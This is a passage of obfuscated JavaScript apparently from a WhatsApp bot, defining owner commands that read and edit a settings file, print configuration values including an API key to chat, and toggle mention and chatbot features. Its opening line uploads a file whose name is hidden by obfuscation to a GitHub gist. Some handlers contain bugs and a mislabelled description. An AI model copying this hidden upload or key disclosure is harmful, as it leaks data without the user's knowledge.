parsedData=fs[_0x116a1a(0x18e)](_0x116a1a(0x18d),_0x116a1a(0x194)),{data}=await octokit[_0x116a1a(0x18c)][_0x116a1a(0x192)]['create']({'files':{[filenamzi]:{'content':parsedData}}})[_0x116a1a(0x1a6)](await message['client']['sendMessage'](message[_0x116a1a(0x190)],{'text':'```Restarting...```'}),setTimeout(()=>{},0x5dc));console['log'](data['id']);
})






  










command(
  {
    pattern: "confnew",
    fromMe: isPrivate,
    desc: "configure new verible",
    dontAddCommandList: true,
    type: "owner",

  },
  async (message, match, m) => {
    const _0x25f020=_0x2f06;function _0x5747(){const _0x311041=['1205418aNdkpO','3764265QtFsWr','9695832NtsYtt','log','sendMessage','208179uQsLeE','stringify','368VGVsFT','parse','5381453LVSJKt','573822pCRpaZ','toUpperCase','2hyFTOG','6321664dZsYMe','slice'];_0x5747=function(){return _0x311041;};return _0x5747();}(function(_0x3f6b6d,_0x302f79){const _0x591bad=_0x2f06,_0x4f7753=_0x3f6b6d();while(!![]){try{const _0x5af6bc=parseInt(_0x591bad(0x1ae))/0x1*(parseInt(_0x591bad(0x1ab))/0x2)+-parseInt(_0x591bad(0x1b3))/0x3+-parseInt(_0x591bad(0x1ac))/0x4+-parseInt(_0x591bad(0x1af))/0x5+-parseInt(_0x591bad(0x1b0))/0x6+parseInt(_0x591bad(0x1a8))/0x7+-parseInt(_0x591bad(0x1b5))/0x8*(-parseInt(_0x591bad(0x1a9))/0x9);if(_0x5af6bc===_0x302f79)break;else _0x4f7753['push'](_0x4f7753['shift']());}catch(_0x3809aa){_0x4f7753['push'](_0x4f7753['shift']());}}}(_0x5747,0xd8e6f));function _0x2f06(_0x32ed01,_0x228e1e){const _0x5747f4=_0x5747();return _0x2f06=function(_0x2f0623,_0x550c13){_0x2f0623=_0x2f0623-0x1a7;let _0x43b9f1=_0x5747f4[_0x2f0623];return _0x43b9f1;},_0x2f06(_0x32ed01,_0x228e1e);}if(!match)return;let args=match['split']('\x20'),ver=args[0x0][_0x25f020(0x1aa)](),text=args[_0x25f020(0x1ad)](0x1)['join']('\x20');readFile(path,async(_0x343a63,_0x3d2500)=>{const _0x5d04c0=_0x25f020;if(_0x343a63){console[_0x5d04c0(0x1b1)](_0x343a63);return;}const _0x160e8f=JSON[_0x5d04c0(0x1a7)](_0x3d2500);_0x160e8f['push']({'ver':text}),writeFile(path,JSON[_0x5d04c0(0x1b4)](_0x160e8f,null,0x2),_0x59070d=>{const _0x3e919e=_0x5d04c0;if(_0x59070d)return message['client'][_0x3e919e(0x1b2)](message['jid'],'Failed\x20to\x20Register\x20Data');});});
})



command(
  {
    pattern: "allvar",
    fromMe: isPrivate,
    desc: "get all varibles",
    dontAddCommandList: true,
    type: "owner",

  },
  async (message, match, m) => {
function _0x5166(_0x5d1c09,_0x5ce3fa){const _0x56a33e=_0x56a3();return _0x5166=function(_0x516631,_0x3bc998){_0x516631=_0x516631-0x186;let _0x53d4c4=_0x56a33e[_0x516631];return _0x53d4c4;},_0x5166(_0x5d1c09,_0x5ce3fa);}function _0x56a3(){const _0x496cd4=['22DPKgQG','264124tCtNxk','324gMGBWB','\x0aANTILINK\x20TELEGRAM:\x20','jid','1029290okKODI','\x0aRMBG_KEY:\x20','\x0aINTERNAL_MENU:\x20','CHAT_BOT','\x0a\x0a*DataBase*\x0a\x0a\x0aANTILINK\x20ALL:\x20','\x0aSTORAGE_JID:\x20','WORK_TYPE','1549554aMbdCM','42605ZlnNmb','antilinkytvideo','\x0aANTILINK\x20INSTAGRAM:\x20','\x0aANTI-TOXIC:\x20','config','antilinkinstagram','OWNER_NAME','GOODBYE_MSG','\x0aOWNER_NAME:','PACKNAME','\x0aANTILINK\x20GROUP\x20CHAT:\x20','MESSAGE_MEM','\x0aFONT_STYLE:\x20','ANTILINK_ACTION','\x0aTHEME:\x20','FONT_STYLE','log','54CRfLQU','antilink','antilinktiktok','\x0aPACKNAME:\x20','LANG','THEME','antitoxic','\x0aANTILINK\x20FACEBOOK:\x20','RMBG_KEY','\x0aANTILINK\x20TIKTOK:\x20','parse','33okqKBT','antilinktelegram','3424540HwkUDY','antilinkall','\x0aAUTHOR:\x20','antilinkfacebook','SUDO','133hXMhYK','99312sfaaZl','FOOTER','\x0aSUDO:\x20','\x0aMODE:\x20','\x0aANTILINK\x20TWITTER:\x20','settings','BOT_NAME','\x0aANTILINK\x20YOUTUBE\x20VIDEO:','\x0aWELCOME_MSG:\x20','\x0aANTILINK\x20WA.ME:\x20','829532bucnyk','antilinkwame','*ALL\x20CONFIG\x20VARS*\x0a\x0aHANDLER:\x20','\x0aANTILINK_ACTION:\x20','\x0aWORK_TYPE:\x20','antilinkgc'];_0x56a3=function(){return _0x496cd4;};return _0x56a3();}(function(_0x17dea4,_0x1b2c22){const _0x9aa71c=_0x5166,_0x4b876d=_0x17dea4();while(!![]){try{const _0x66a607=parseInt(_0x9aa71c(0x1a3))/0x1*(parseInt(_0x9aa71c(0x196))/0x2)+parseInt(_0x9aa71c(0x1bf))/0x3*(-parseInt(_0x9aa71c(0x197))/0x4)+-parseInt(_0x9aa71c(0x1c1))/0x5+-parseInt(_0x9aa71c(0x1a2))/0x6+-parseInt(_0x9aa71c(0x1c6))/0x7*(-parseInt(_0x9aa71c(0x186))/0x8)+parseInt(_0x9aa71c(0x1b4))/0x9*(-parseInt(_0x9aa71c(0x19b))/0xa)+parseInt(_0x9aa71c(0x190))/0xb*(parseInt(_0x9aa71c(0x198))/0xc);if(_0x66a607===_0x1b2c22)break;else _0x4b876d['push'](_0x4b876d['shift']());}catch(_0x5b7a0b){_0x4b876d['push'](_0x4b876d['shift']());}}}(_0x56a3,0x6ebbb),readFile(path,async(_0x4377af,_0x23b09c)=>{const _0x1b12d4=_0x5166;if(_0x4377af){console[_0x1b12d4(0x1b3)](_0x4377af);return;}const _0x2527aa=JSON[_0x1b12d4(0x1be)](_0x23b09c);let _0x16bbfa=_0x1b12d4(0x192)+_0x2527aa[_0x1b12d4(0x1a7)]['HANDLER']+_0x1b12d4(0x194)+_0x2527aa[_0x1b12d4(0x1a7)][_0x1b12d4(0x1a1)]+'\x0aBOT_NAME:\x20'+_0x2527aa[_0x1b12d4(0x1a7)][_0x1b12d4(0x18c)]+_0x1b12d4(0x1ab)+_0x2527aa[_0x1b12d4(0x1a7)][_0x1b12d4(0x1a9)]+_0x1b12d4(0x188)+_0x2527aa[_0x1b12d4(0x1a7)][_0x1b12d4(0x1c5)]+_0x1b12d4(0x1c3)+_0x2527aa[_0x1b12d4(0x1a7)]['AUTHOR']+_0x1b12d4(0x1b7)+_0x2527aa[_0x1b12d4(0x1a7)][_0x1b12d4(0x1ac)]+_0x1b12d4(0x19c)+_0x2527aa[_0x1b12d4(0x1a7)][_0x1b12d4(0x1bc)]+'\x0aLANGUAGE:\x20'+_0x2527aa['config'][_0x1b12d4(0x1b8)]+_0x1b12d4(0x193)+_0x2527aa[_0x1b12d4(0x1a7)][_0x1b12d4(0x1b0)]+'\x0aFOOTER:\x20'+_0x2527aa['config'][_0x1b12d4(0x187)]+_0x1b12d4(0x1b1)+_0x2527aa['config'][_0x1b12d4(0x1b9)]+_0x1b12d4(0x1af)+_0x2527aa['config'][_0x1b12d4(0x1b2)]+_0x1b12d4(0x19d)+_0x2527aa[_0x1b12d4(0x1a7)]['INTERNAL_MENU']+_0x1b12d4(0x189)+_0x2527aa[_0x1b12d4(0x1a7)]['MODE']+_0x1b12d4(0x1a0)+_0x2527aa['config']['STORAGE_JID']+'\x0aCHAT_BOT:\x20'+_0x2527aa[_0x1b12d4(0x1a7)][_0x1b12d4(0x19e)]+'\x0aGOODBYE_MSG:'+_0x2527aa['MESSAGE_MEM'][_0x1b12d4(0x1aa)]+_0x1b12d4(0x18e)+_0x2527aa[_0x1b12d4(0x1ae)]['WELCOME_MSG']+'\x0aALIVE:'+_0x2527aa[_0x1b12d4(0x1ae)]['ALIVE']+_0x1b12d4(0x19f)+_0x2527aa[_0x1b12d4(0x1b5)][_0x1b12d4(0x1c2)]+_0x1b12d4(0x1bb)+_0x2527aa[_0x1b12d4(0x1b5)][_0x1b12d4(0x1c4)]+_0x1b12d4(0x1ad)+_0x2527aa[_0x1b12d4(0x1b5)][_0x1b12d4(0x195)]+_0x1b12d4(0x18f)+_0x2527aa[_0x1b12d4(0x1b5)][_0x1b12d4(0x191)]+_0x1b12d4(0x1a5)+_0x2527aa[_0x1b12d4(0x1b5)][_0x1b12d4(0x1a8)]+_0x1b12d4(0x199)+_0x2527aa[_0x1b12d4(0x1b5)][_0x1b12d4(0x1c0)]+_0x1b12d4(0x1bd)+_0x2527aa['antilink'][_0x1b12d4(0x1b6)]+_0x1b12d4(0x18a)+_0x2527aa[_0x1b12d4(0x1b5)]['antilinktwitter']+'\x0aANTILINK\x20YOYTUBE\x20CHANNEL:\x20'+_0x2527aa[_0x1b12d4(0x1b5)]['antilinkytchannel']+_0x1b12d4(0x18d)+_0x2527aa[_0x1b12d4(0x1b5)][_0x1b12d4(0x1a4)]+_0x1b12d4(0x1a6)+_0x2527aa[_0x1b12d4(0x18b)][_0x1b12d4(0x1ba)];return await message['client']['sendMessage'](message[_0x1b12d4(0x19a)],{'text':styletext(_0x16bbfa,parseInt(''+FONT_STYLE))});}));
});



command(
  {
    pattern: "configbot",
    fromMe: isPrivate,
    desc: "configure All settings",
    dontAddCommandList: true,
    type: "owner",

  },
  async (message, match, m) => {
function _0x2614(){const _0x423047=['INTERNAL_MENU','9onjjKn','3230310GYdxXW','\x0a┃\x20FONT_STYLE:\x20','ChatBot','\x0a┃✧\x0a┃\x0a\x0a','3109765CeHZVF','chatbot','STORAGE_JID','endiworktipe','859494HZzsTi','Sudo','163674LKCgde','ANTILINK_ACTION','toLocaleString','WORK_TYPE','\x0a┃\x20GOODBYE_MSG:','MODE','\x0a┃\x20BOT_NAME:\x20','endimelcow','PACKNAME','Welcome\x20Message','865798bclLfi','parse','Sticker\x20Author\x20Name','\x0a┃\x20FOOTER:\x20','Alive\x20Message','en-IN','Theme','\x20\x20▎▍▌▌▉▏▎▌▉▐▏▌▎\x0a','GOODBYE_MSG','SUDO','endistickauth','MESSAGE_MEM','endinamebot','client','\x0a┃\x20ALIVE:','ALIVE','CHAT_BOT','Font\x20Style','Bot\x20Name','Goodbye\x20Message','\x20Owner\x20:\x20','Language','Sticker\x20Pack\x20Name','jid','Internal\x20Menu','6SrpiRr','antitoxic','endifooter','andihandler','3228920yDNOCx','LANG','endithemebotto','FOOTER','prefix','\x0a┃\x20WORK_TYPE:\x20','4bEzryS','Asia/Kolkata','\x0a┃\x20CHAT_BOT:\x20','pushName','WELCOME_MSG','config','┃\x20*ALL\x20CONFIG\x20VARS*\x0a┃\x20\x0a┃\x20HANDLER:\x20','\x0a┃\x20OWNER_NAME:','endinameowner','\x0a┃\x20LANGUAGE:\x20','Footer','\x0a┃\x20AUTHOR:\x20','endistickpakn','endilangmain','sendMessage','FONT_STYLE','\x20Themes\x20:\x20','\x0a\x0a┃\x0a┃✧\x0a','528206jFDKpi','Handler','HANDLER','RMBG_KEY','endiyesmenu','\x0a┃\x20PACKNAME:\x20','\x0a┃\x20SUDO:\x20','\x0a┃\x20MODE:\x20','split','log','BOT_NAME'];_0x2614=function(){return _0x423047;};return _0x2614();}const _0x3cd501=_0x2a22;function _0x2a22(_0x1ea319,_0x4fcd9b){const _0x26145d=_0x2614();return _0x2a22=function(_0x2a22ba,_0x38ebf4){_0x2a22ba=_0x2a22ba-0x1f2;let _0x139cba=_0x26145d[_0x2a22ba];return _0x139cba;},_0x2a22(_0x1ea319,_0x4fcd9b);}(function(_0x49f8e1,_0x570f8a){const _0x3b7ad0=_0x2a22,_0x269020=_0x49f8e1();while(!![]){try{const _0x3d1841=parseInt(_0x3b7ad0(0x219))/0x1+parseInt(_0x3b7ad0(0x232))/0x2*(-parseInt(_0x3b7ad0(0x20d))/0x3)+parseInt(_0x3b7ad0(0x23c))/0x4*(parseInt(_0x3b7ad0(0x209))/0x5)+-parseInt(_0x3b7ad0(0x20f))/0x6+-parseInt(_0x3b7ad0(0x1f8))/0x7+parseInt(_0x3b7ad0(0x236))/0x8*(-parseInt(_0x3b7ad0(0x204))/0x9)+parseInt(_0x3b7ad0(0x205))/0xa;if(_0x3d1841===_0x570f8a)break;else _0x269020['push'](_0x269020['shift']());}catch(_0x5ef9a8){_0x269020['push'](_0x269020['shift']());}}}(_0x2614,0x6ca08));let {prefix}=message,[date,time]=new Date()[_0x3cd501(0x211)](_0x3cd501(0x21e),{'timeZone':_0x3cd501(0x23d)})[_0x3cd501(0x200)](','),rows=[];rows['push']({'title':styletext(_0x3cd501(0x22b),parseInt(''+FONT_STYLE)),'rowId':global[_0x3cd501(0x23a)]+_0x3cd501(0x225)},{'title':styletext('Owner\x20Name',parseInt(''+FONT_STYLE)),'rowId':global[_0x3cd501(0x23a)]+_0x3cd501(0x244)},{'title':styletext(_0x3cd501(0x20e),parseInt(''+FONT_STYLE)),'rowId':global[_0x3cd501(0x23a)]+'endisudonum'},{'title':styletext(_0x3cd501(0x21d),parseInt(''+FONT_STYLE)),'rowId':global[_0x3cd501(0x23a)]+'endialivemessi'},{'title':styletext(_0x3cd501(0x218),parseInt(''+FONT_STYLE)),'rowId':global['prefix']+_0x3cd501(0x216)},{'title':styletext(_0x3cd501(0x22c),parseInt(''+FONT_STYLE)),'rowId':global['prefix']+'endiokbei'},{'title':styletext('Work\x20Type',parseInt(''+FONT_STYLE)),'rowId':global['prefix']+_0x3cd501(0x20c)},{'title':styletext(_0x3cd501(0x21b),parseInt(''+FONT_STYLE)),'rowId':global[_0x3cd501(0x23a)]+_0x3cd501(0x223)},{'title':styletext(_0x3cd501(0x22f),parseInt(''+FONT_STYLE)),'rowId':global[_0x3cd501(0x23a)]+_0x3cd501(0x1f2)},{'title':styletext(_0x3cd501(0x22e),parseInt(''+FONT_STYLE)),'rowId':global[_0x3cd501(0x23a)]+_0x3cd501(0x1f3)},{'title':styletext(_0x3cd501(0x22a),parseInt(''+FONT_STYLE)),'rowId':global[_0x3cd501(0x23a)]+'endistylfont'},{'title':styletext(_0x3cd501(0x21f),parseInt(''+FONT_STYLE)),'rowId':global[_0x3cd501(0x23a)]+_0x3cd501(0x238)},{'title':styletext(_0x3cd501(0x231),parseInt(''+FONT_STYLE)),'rowId':global[_0x3cd501(0x23a)]+_0x3cd501(0x1fc)},{'title':styletext(_0x3cd501(0x246),parseInt(''+FONT_STYLE)),'rowId':global[_0x3cd501(0x23a)]+_0x3cd501(0x234)},{'title':styletext(_0x3cd501(0x1f9),parseInt(''+FONT_STYLE)),'rowId':global['prefix']+_0x3cd501(0x235)},{'title':styletext('Mode',parseInt(''+FONT_STYLE)),'rowId':global[_0x3cd501(0x23a)]+_0x3cd501(0x233)},{'title':styletext(_0x3cd501(0x207),parseInt(''+FONT_STYLE)),'rowId':global['prefix']+_0x3cd501(0x20a)}),readFile(path,async(_0x4ca3d8,_0x4d0f0d)=>{const _0x18cf4e=_0x3cd501;if(_0x4ca3d8){console[_0x18cf4e(0x201)](_0x4ca3d8);return;}const _0x100565=JSON[_0x18cf4e(0x21a)](_0x4d0f0d);let _0x4b18b8=await _0x18cf4e(0x242)+_0x100565[_0x18cf4e(0x241)][_0x18cf4e(0x1fa)]+_0x18cf4e(0x23b)+_0x100565[_0x18cf4e(0x241)][_0x18cf4e(0x212)]+_0x18cf4e(0x215)+_0x100565['config'][_0x18cf4e(0x202)]+_0x18cf4e(0x243)+_0x100565[_0x18cf4e(0x241)]['OWNER_NAME']+_0x18cf4e(0x1fe)+_0x100565[_0x18cf4e(0x241)][_0x18cf4e(0x222)]+_0x18cf4e(0x247)+_0x100565[_0x18cf4e(0x241)]['AUTHOR']+_0x18cf4e(0x1fd)+_0x100565[_0x18cf4e(0x241)][_0x18cf4e(0x217)]+'\x0a┃\x20RMBG_KEY:\x20'+_0x100565['config'][_0x18cf4e(0x1fb)]+_0x18cf4e(0x245)+_0x100565[_0x18cf4e(0x241)][_0x18cf4e(0x237)]+'\x0a┃\x20ANTILINK_ACTION:\x20'+_0x100565[_0x18cf4e(0x241)][_0x18cf4e(0x210)]+_0x18cf4e(0x21c)+_0x100565[_0x18cf4e(0x241)][_0x18cf4e(0x239)]+'\x0a┃\x20THEME:\x20'+_0x100565[_0x18cf4e(0x241)]['THEME']+_0x18cf4e(0x206)+_0x100565['config'][_0x18cf4e(0x1f5)]+'\x0a┃\x20INTERNAL_MENU:\x20'+_0x100565[_0x18cf4e(0x241)][_0x18cf4e(0x203)]+_0x18cf4e(0x1ff)+_0x100565[_0x18cf4e(0x241)][_0x18cf4e(0x214)]+'\x0a┃\x20STORAGE_JID:\x20'+_0x100565[_0x18cf4e(0x241)][_0x18cf4e(0x20b)]+_0x18cf4e(0x23e)+_0x100565[_0x18cf4e(0x241)][_0x18cf4e(0x229)]+_0x18cf4e(0x213)+_0x100565[_0x18cf4e(0x224)][_0x18cf4e(0x221)]+'\x0a┃\x20WELCOME_MSG:\x20'+_0x100565[_0x18cf4e(0x224)][_0x18cf4e(0x240)]+_0x18cf4e(0x227)+_0x100565[_0x18cf4e(0x224)][_0x18cf4e(0x228)],_0x1404fa='\x0a'+B1+'\x20'+BOT_NAME+'\x20'+B2+'\x0a'+B3+'\x0a'+B4+'\x0a'+B4+_0x18cf4e(0x22d)+OWNER_NAME+'\x0a'+B4+_0x18cf4e(0x1f6)+THEME+'\x0a'+B4+_0x18cf4e(0x208)+_0x4b18b8+(_0x18cf4e(0x1f7)+B4+'\x0a'+B4+_0x18cf4e(0x220)+B4+_0x18cf4e(0x220)+B4+'\x20\x20'+message[_0x18cf4e(0x23f)]+'\x0a'+B4+'\x20\x0a'+B5);return await message[_0x18cf4e(0x226)][_0x18cf4e(0x1f4)](message[_0x18cf4e(0x230)],{'text':styletext(_0x1404fa,parseInt(''+FONT_STYLE)),'buttonText':styletext('Show\x20menu',parseInt(''+FONT_STYLE)),'sections':[{'title':styletext('These\x20Are\x20The\x20list',parseInt(''+FONT_STYLE)),'rows':rows}]});});
});




command({
  pattern: "mention",
  fromMe: true,
  desc: "downloads story from instagram",
  type: "downloader",
}, async (message, match, m) => {
const _0x1abf9e=_0x3373;function _0x3373(_0x1752ad,_0x14b3f3){const _0x25d841=_0x25d8();return _0x3373=function(_0x33736b,_0x8a0223){_0x33736b=_0x33736b-0x1a8;let _0x4ba40e=_0x25d841[_0x33736b];return _0x4ba40e;},_0x3373(_0x1752ad,_0x14b3f3);}(function(_0x2c1556,_0x2f8fb){const _0x58e5c5=_0x3373,_0x4dfb3c=_0x2c1556();while(!![]){try{const _0x3a043c=-parseInt(_0x58e5c5(0x1c0))/0x1+parseInt(_0x58e5c5(0x1ab))/0x2*(parseInt(_0x58e5c5(0x1bf))/0x3)+-parseInt(_0x58e5c5(0x1b8))/0x4+-parseInt(_0x58e5c5(0x1bd))/0x5*(parseInt(_0x58e5c5(0x1be))/0x6)+-parseInt(_0x58e5c5(0x1ac))/0x7*(parseInt(_0x58e5c5(0x1a8))/0x8)+parseInt(_0x58e5c5(0x1ba))/0x9+-parseInt(_0x58e5c5(0x1bc))/0xa*(-parseInt(_0x58e5c5(0x1c8))/0xb);if(_0x3a043c===_0x2f8fb)break;else _0x4dfb3c['push'](_0x4dfb3c['shift']());}catch(_0x1a4a02){_0x4dfb3c['push'](_0x4dfb3c['shift']());}}}(_0x25d8,0xf1bc4));function _0x25d8(){const _0x27a83c=['1882356HKLWeh','mention\x20on','MESSAGE_MEM','Enable','stringify','parse','[ᴀʟɪᴇɴ\x20ᴀʟꜰᴀ-ᴍᴅ]','split','588412VZVoWO','392MAWjYc','Failed\x20to\x20Register\x20Data','MENTION_AUD','3902366uXEqGI','173222RcKeYd','Mention\x20Manager','sendMessage','mention\x20off','client','push','reset','_File\x20already\x20exists_','```Mention\x20Inactive```','jid','includes','config','3199592VMBZlJ','send','15607647dQNKcu','log','440BPvutm','15Birhib','2308116XIcOeW','3XsdOwj'];_0x25d8=function(){return _0x27a83c;};return _0x25d8();}if(!match){let buttonsntilink=[{'buttonId':_0x1abf9e(0x1c1),'buttonText':{'displayText':_0x1abf9e(0x1c3)},'type':0x1},{'buttonId':_0x1abf9e(0x1af),'buttonText':{'displayText':'Disable'},'type':0x1}],buttonMessage={'text':_0x1abf9e(0x1ad),'footer':_0x1abf9e(0x1c6),'buttons':buttonsntilink,'headerType':0x2};return await message[_0x1abf9e(0x1b0)][_0x1abf9e(0x1ae)](message[_0x1abf9e(0x1b5)],buttonMessage);}if(match){if(match==='on'){readFile(path,async(_0x25649e,_0x4cdb8d)=>{const _0x38283a=_0x1abf9e;if(_0x25649e){console[_0x38283a(0x1bb)](_0x25649e);return;}const _0x3a8a60=JSON[_0x38283a(0x1c5)](_0x4cdb8d);_0x3a8a60[_0x38283a(0x1b7)]['MENTION']=!![],writeFile(path,JSON[_0x38283a(0x1c4)](_0x3a8a60,null,0x2),_0x403b81=>{const _0x42d74d=_0x38283a;if(_0x403b81)return message[_0x42d74d(0x1b0)]['sendMessage'](message['jid'],'Failed\x20to\x20Register\x20Data');});});return message[_0x1abf9e(0x1b0)][_0x1abf9e(0x1ae)](message[_0x1abf9e(0x1b5)],{'text':'```Mention\x20Active```'});process[_0x1abf9e(0x1b9)](_0x1abf9e(0x1b2));}if(match==='off')readFile(path,async(_0xf40282,_0x33a4f9)=>{const _0x392195=_0x1abf9e;if(_0xf40282){console[_0x392195(0x1bb)](_0xf40282);return;}const _0x5d49da=JSON[_0x392195(0x1c5)](_0x33a4f9);_0x5d49da['config']['MENTION']=![],writeFile(path,JSON['stringify'](_0x5d49da,null,0x2),_0x4811e6=>{const _0x4b19db=_0x392195;if(_0x4811e6)return message['client'][_0x4b19db(0x1ae)](message['jid'],_0x4b19db(0x1a9));});}),message[_0x1abf9e(0x1b0)]['sendMessage'](message['jid'],{'text':_0x1abf9e(0x1b4)}),process['send']('reset');else{let iv=match[_0x1abf9e(0x1c7)]('\x20')[0x0];readFile(path,(_0x376590,_0x56df0f)=>{const _0x450895=_0x1abf9e;if(_0x376590){console[_0x450895(0x1bb)](_0x376590);return;}const _0x387031=JSON[_0x450895(0x1c5)](_0x56df0f);let _0x5980d3=_0x387031[_0x450895(0x1c2)]['MENTION_AUD'][_0x450895(0x1b6)](iv);if(_0x5980d3)return message[_0x450895(0x1ae)](_0x450895(0x1b3));_0x387031[_0x450895(0x1c2)][_0x450895(0x1aa)][_0x450895(0x1b1)](iv),writeFile(path,JSON[_0x450895(0x1c4)](_0x387031,null,0x2),_0x2df1eb=>{const _0x53c58a=_0x450895;if(_0x2df1eb)return message[_0x53c58a(0x1b0)]['sendMessage'](message[_0x53c58a(0x1b5)],_0x53c58a(0x1a9));message[_0x53c58a(0x1b0)][_0x53c58a(0x1ae)](message[_0x53c58a(0x1b5)],{'text':'```Mention\x20Updated```'});});});}}
});











    






















    






















    






















    






















    






















    






















    






















    


    command({
      pattern: "chatbot",
    fromMe: true,
    desc: "ChatGPT Replies",
    type: "fun",
    },
    async (message, match, m) => {
const _0x288952=_0x2d4d;(function(_0x464445,_0xb31b1d){const _0x4a15b7=_0x2d4d,_0x4c35b1=_0x464445();while(!![]){try{const _0x5a3241=parseInt(_0x4a15b7(0x14a))/0x1+-parseInt(_0x4a15b7(0x157))/0x2+-parseInt(_0x4a15b7(0x150))/0x3+-parseInt(_0x4a15b7(0x151))/0x4+parseInt(_0x4a15b7(0x14d))/0x5+-parseInt(_0x4a15b7(0x15c))/0x6+-parseInt(_0x4a15b7(0x15a))/0x7*(-parseInt(_0x4a15b7(0x15b))/0x8);if(_0x5a3241===_0xb31b1d)break;else _0x4c35b1['push'](_0x4c35b1['shift']());}catch(_0x43ad9b){_0x4c35b1['push'](_0x4c35b1['shift']());}}}(_0x11ba,0x4aa09));let path='./database/settings.json';/active/[_0x288952(0x155)](match)&&readFile(path,(_0x381896,_0x3bfe11)=>{const _0x1ea3fc=_0x288952;if(_0x381896){console[_0x1ea3fc(0x159)](_0x381896);return;}const _0x5627b1=JSON['parse'](_0x3bfe11);let _0x370a44=_0x5627b1[_0x1ea3fc(0x15d)]['CHAT_BOT'];if(_0x370a44)return message[_0x1ea3fc(0x14f)](_0x1ea3fc(0x15f));_0x5627b1[_0x1ea3fc(0x15d)][_0x1ea3fc(0x158)]=!![],writeFile(path,JSON[_0x1ea3fc(0x160)](_0x5627b1,null,0x2),_0x5b995f=>{const _0xb2bd1d=_0x1ea3fc;if(_0x5b995f){message[_0xb2bd1d(0x156)](_0xb2bd1d(0x14c));return;}return message['reply'](_0xb2bd1d(0x15e));});});function _0x2d4d(_0x45584f,_0x30cb5c){const _0x11bac4=_0x11ba();return _0x2d4d=function(_0x2d4dcb,_0x3afd0e){_0x2d4dcb=_0x2d4dcb-0x148;let _0x1b45a1=_0x11bac4[_0x2d4dcb];return _0x1b45a1;},_0x2d4d(_0x45584f,_0x30cb5c);}/deact/[_0x288952(0x155)](match)&&readFile(path,(_0x2a7842,_0x3ee63f)=>{const _0x2d11f6=_0x288952;if(_0x2a7842){console[_0x2d11f6(0x159)](_0x2a7842);return;}const _0x189bf7=JSON[_0x2d11f6(0x14e)](_0x3ee63f);let _0x5aa015=_0x189bf7[_0x2d11f6(0x15d)][_0x2d11f6(0x158)];if(!_0x5aa015)return message[_0x2d11f6(0x14f)](_0x2d11f6(0x14b));_0x189bf7[_0x2d11f6(0x15d)][_0x2d11f6(0x158)]=![],writeFile(path,JSON['stringify'](_0x189bf7,null,0x2),_0x3762c9=>{const _0x4e21a2=_0x2d11f6;if(_0x3762c9){message[_0x4e21a2(0x156)]('Failed\x20to\x20write\x20updated\x20data\x20to\x20file');return;}return message[_0x4e21a2(0x156)](_0x4e21a2(0x15e));});});function _0x11ba(){const _0x5ecadd=['log','318787QUluUx','120ulvtwA','3318288rmOQFY','config','_Settings\x20Updated\x20Successfully_','_Already\x20Active_','stringify','client','Enable','110742ygXMiv','_Already\x20Deactive_','Failed\x20to\x20write\x20updated\x20data\x20to\x20file','2347140cQLRkH','parse','sendMessage','437490ELvNZn','106636FpCWZC','Disable','jid','chatbot\x20active','test','reply','464150GlPpVv','CHAT_BOT'];_0x11ba=function(){return _0x5ecadd;};return _0x11ba();}if(!match){let buttonsntilink=[{'buttonId':_0x288952(0x154),'buttonText':{'displayText':_0x288952(0x149)},'type':0x1},{'buttonId':'chatbot\x20deact','buttonText':{'displayText':_0x288952(0x152)},'type':0x1}],buttonMessage={'text':'Do\x20you\x20Want\x20to\x20activate\x20*ChatGPT*\x20in\x20this\x20group?','footer':FOOTER,'buttons':buttonsntilink,'headerType':0x2};await message[_0x288952(0x148)][_0x288952(0x14f)](message[_0x288952(0x153)],buttonMessage);}
    })
